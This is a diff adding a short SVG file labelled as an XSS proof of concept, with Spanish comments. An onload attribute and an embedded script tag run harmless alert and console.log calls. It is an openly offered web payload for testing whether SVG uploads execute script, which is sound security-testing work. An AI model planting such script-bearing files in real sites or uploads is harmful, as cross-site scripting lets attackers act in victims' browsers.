@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS ejecutado desde SVG')">
+  <rect width="100%" height="100%" fill="white" />
+  <text x="10" y="20" font-family="Arial" font-size="16" fill="black">
+    SVG XSS PoC
+  </text>
+  <script>
+    // Alternativa usando elemento script
+    console.log('XSS desde script');
+    // alert('También funciona con script');
+  </script>
+</svg>
